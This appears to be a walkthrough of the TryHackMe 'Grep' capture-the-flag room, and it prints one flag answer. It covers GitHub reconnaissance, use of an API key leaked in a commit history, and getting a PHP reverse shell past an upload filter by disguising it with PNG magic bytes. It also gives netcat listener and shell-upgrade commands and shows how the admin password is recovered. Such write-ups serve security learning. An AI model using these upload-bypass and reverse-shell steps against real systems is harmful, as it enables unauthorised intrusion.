# [Grep](https://tryhackme.com/room/greprtp)

> A challenge that tests your reconnaissance and OSINT skills.

## Scanning

scan the target

```
nmap -sS -sV -T4 -p- 10.10.47.192
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8eea4c33-a3e6-4f14-9788-2c6fb5fccc9e)

3 open web servers (80,443,51337)

## HTTP

let's check the webapp, it seem nothing on port 80

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9c092200-27e8-47cd-836e-f650f2eb00e4)

and port 443 got error

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c52682cb-c0de-4ed0-b93b-ecf57e4349b6)

refer to previous nmap report, i need to add domain grep.thm to hosts file

```
echo "10.10.47.192  grep.thm" >> /etc/hosts
```

okay, here you are

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1f57df76-a604-4f01-b899-c3d540853d5a)

## Enumeration

as the hint, the website is developed by SuperSecure Corp, and it's under developed

after a bit research i find it on Github with `"SearchME" AND "This website is under development"`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d6a19b7c-4e54-432a-b162-c678a06293b0)

exactly what we need, only 4 commits and it's also a new project

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/535843cf-d107-4799-8364-a65402e88376)

i found some endpoints here

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f581e7a8-b619-4631-8b6a-1851bdeb7e41)

i tried to register an account but it need an API key

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b0f69e05-5904-4eaa-bb17-be19ea88f752)

i can easily get key via a commit "remove key"

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cabec059-62ae-4550-aa0f-50d8ba84d7c2)

open burpsuite, catch request, change X-THM-API-Key to our key

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ce6a28c3-2bf5-4f61-8aa1-a8f30912c154)

after login, we got the first flag

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d2c38954-7c7e-414a-a199-9d56adb39629)

| Flag | First flag |
| --- | --- |
| Answer | THM{4ec9806d7e1350270dc402ba870ccebb} |

## Exploitation

another endpoint is upload.php allowed us upload images to /uploads

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/af510b59-dc11-4d7d-98cb-80504a4a7498)

```
cp /usr/share/webshells/php/php-reverse-shell.php .
vi php-reverse-shell.php
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e2d714bc-2e86-404d-bc0b-4197015c6832)

remember, webserver filter file by 2 things: extensions and magic bytes

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/27d0d8b0-d8a3-4ccf-bf06-75befb1f757f)

so, we need to change both extension and some magic bytes

```
mv php-reverse-shell.php reverse.png.php
vi reverse.png.php
```

padding some characters at the beginning of file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0ec55307-ed53-4dd3-be43-9aee988e1127)

change the padding hex to png magic bytes

```
hexedit reverse.png.php
89 50 4e 47
Ctrl+X
xxd reverse.png.php | head
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4a89a5dd-f29f-45d1-8a5c-06f48fa5e4be)

file uploaded successfully

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/da192a83-8f52-4e87-98b1-39bca5144c01)

```
nc -vlnp 1234
```

go to https://grep.thm/api/uploads/ and click to our file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b64e0960-041f-43a5-a4d1-0aba83e3fb42)

we got our shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5db92b3a-6ed1-4da7-826c-97c56b6dc3e7)

i checked nothing at home folders, but in our /var/www, i see 2 interesting folder

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e84150a1-76d9-47c7-a092-c4d097a90847)

we only have permission on user.sql maybe contain admin's email

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8097c0f2-dacb-478c-8d79-8141af8004ab)

```
cd backup
grep admin user.sql
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/81a91ee4-394d-411c-8aa4-01976a114ae9)

backto leakchecker and a lot of certificate in web folder, i think it related to a domain

```
echo "10.10.47.192  leakchecker.grep.thm" >> /etc/hosts
```

here, you can find it in port 51337 from previous nmap scan

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c1193173-c46a-4457-8190-f2bd53efac2d)

just enter admin's email to get password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f5088a59-08ec-4b4f-9150-a854b41546dc)













.

| Flag | user.txt |
| --- | --- |
| Answer | <flag> |
